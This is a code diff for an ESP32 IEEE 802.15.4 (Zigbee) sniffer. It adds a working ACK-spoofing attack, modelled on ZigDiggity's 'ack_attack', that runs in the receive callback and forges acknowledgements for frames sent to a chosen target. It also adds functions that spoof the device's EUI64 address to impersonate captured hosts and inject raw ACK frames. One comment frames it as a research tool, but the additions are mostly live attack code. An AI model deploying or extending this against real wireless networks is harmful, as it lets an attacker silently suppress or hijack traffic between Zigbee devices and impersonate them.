@@ -35,6 +35,10 @@ extern "C" void esp_ieee802154_transmit_failed(const uint8_t *frame,
 // -- Static members ------------------------------------------------------------
 QueueHandle_t IEEE802154Sniffer::_rxQueue = nullptr;
 
+volatile bool     IEEE802154Sniffer::_ackAttackActive = false;
+volatile uint16_t IEEE802154Sniffer::_ackAttackTarget = 0xFFFF;
+volatile uint32_t IEEE802154Sniffer::_ackAttackCount  = 0;
+
 static const uint8_t HOP_CHANNELS[] = {11,15,20,25,26,12,16,21};
 static const uint8_t HOP_COUNT = sizeof(HOP_CHANNELS);
 
@@ -44,6 +48,36 @@ void IEEE802154Sniffer::rxCallback(uint8_t *frame,
     if (!_rxQueue || !frame) return;
     uint8_t len = frame[0];
     if (len < 3 || len > SNIFFER_MAX_FRAME_LEN) return;
+
+    // --- ACK-attack fast path (ZigDiggity "ack_attack") ---------------------
+    // Runs in the receive-done ISR/driver context so we react before the real
+    // target's radio can. If this frame is a data frame addressed (short) to
+    // the attack target and it requests an ACK, inject a spoofed ACK with the
+    // matching sequence number *immediately* — no sleep/receive dance (that
+    // path takes milliseconds; the 802.15.4 ACK window is ~192us).
+    // Caveat: even from here, whether we beat the legitimate device depends on
+    // driver turnaround and RF proximity; treat wins as best-effort. Also
+    // note esp_ieee802154_transmit() is being called from the receive_done
+    // context, which is not a documented-safe reentrancy point - it works in
+    // practice for this research tool but is the first suspect if the radio
+    // wedges under sustained attack.
+    if (_ackAttackActive && len >= 9) {         // FC(2)+seq(1)+dstPAN(2)+dst(2)+FCS(2)
+        uint8_t fcLow  = frame[1];
+        uint8_t fcHigh = frame[2];
+        uint8_t ftype  = fcLow & FC_FRAME_TYPE_MASK;
+        bool    ackReq = (fcLow >> 5) & 0x01;
+        uint8_t dstMode = (fcHigh >> 2) & 0x03;
+        if (ftype == FC_FRAME_TYPE_DATA && ackReq && dstMode == ADDR_MODE_SHORT) {
+            uint16_t dst = (uint16_t)frame[6] | ((uint16_t)frame[7] << 8);
+            if (dst == _ackAttackTarget) {
+                // Bare ACK: len(1)=5 | FC(2)=0x0200 | seq(1) | radio adds FCS(2)
+                uint8_t ackBuf[4] = { 0x05, 0x02, 0x00, frame[3] };
+                esp_ieee802154_transmit(ackBuf, false);
+                _ackAttackCount++;
+                // Fall through: still queue the frame so it shows in the sniff log.
+            }
+        }
+    }
 
     SnifferFrame sf;
     sf.len          = len - 2;  // strip FCS
@@ -103,6 +137,10 @@ bool IEEE802154Sniffer::init(uint8_t channel) {
     // reconstructs srcExtended/dstExtended from wire bytes.
     _ownEUI64 = 0;
     for (int i = 0; i < 8; i++) _ownEUI64 = (_ownEUI64 << 8) | eui64[i];
+
+    // Remember the real hardware MAC so a spoofed EUI64 can be reverted exactly.
+    _hwEUI64 = _ownEUI64;
+    memcpy(_hwEUI64Bytes, eui64, 8);
 
     _initialised = true;
 
@@ -1054,6 +1092,49 @@ bool IEEE802154Sniffer::sendRawFrame(const uint8_t *frame, uint8_t frameLen) {
         return false;
     }
     return true;
+}
+
+// -- EUI64 spoofing ------------------------------------------------------------
+// _ownEUI64 uses the same integer convention as HostRecord::extAddr and the
+// nonce/TX builders (byte i at bit 8*i == on-air byte i), so a value copied
+// straight from a host record reproduces that device's address on air.
+void IEEE802154Sniffer::setOwnEUI64(uint64_t eui64) {
+    _ownEUI64 = eui64;
+    uint8_t buf[8];
+    for (int i = 0; i < 8; i++) buf[i] = (uint8_t)(eui64 >> (8 * i));  // on-air LE
+    esp_ieee802154_set_extended_address(buf);
+    Serial.printf("[Spoof] Own EUI64 set to %016llX%s\n",
+                  eui64, (eui64 == _hwEUI64) ? " (hardware)" : " (SPOOFED)");
+}
+
+void IEEE802154Sniffer::restoreOwnEUI64() {
+    _ownEUI64 = _hwEUI64;
+    esp_ieee802154_set_extended_address(_hwEUI64Bytes);
+    Serial.printf("[Spoof] Own EUI64 restored to hardware %016llX\n", _hwEUI64);
+}
+
+// -- MAC ACK injection (slow path) ---------------------------------------------
+bool IEEE802154Sniffer::sendAck(uint8_t seqNum) {
+    uint8_t frame[3];
+    frame[0] = 0x02;   // FC low: type=ACK(2), no security
+    frame[1] = 0x00;   // FC high: no addressing
+    frame[2] = seqNum;
+    return sendRawFrame(frame, sizeof(frame));
+}
+
+// -- ACK-attack control (fast path lives in rxCallback) ------------------------
+void IEEE802154Sniffer::startAckAttack(uint16_t target) {
+    _ackAttackTarget = target;
+    _ackAttackCount  = 0;
+    _ackAttackActive = true;
+    Serial.printf("[ATTACK] ACK-attack armed against 0x%04X — spoofing ACKs from RX ISR\n",
+                  target);
+}
+
+void IEEE802154Sniffer::stopAckAttack() {
+    _ackAttackActive = false;
+    Serial.printf("[ATTACK] ACK-attack stopped (0x%04X, %lu ACKs injected)\n",
+                  _ackAttackTarget, (unsigned long)_ackAttackCount);
 }
 
 // -- Beacon Request TX ---------------------------------------------------------
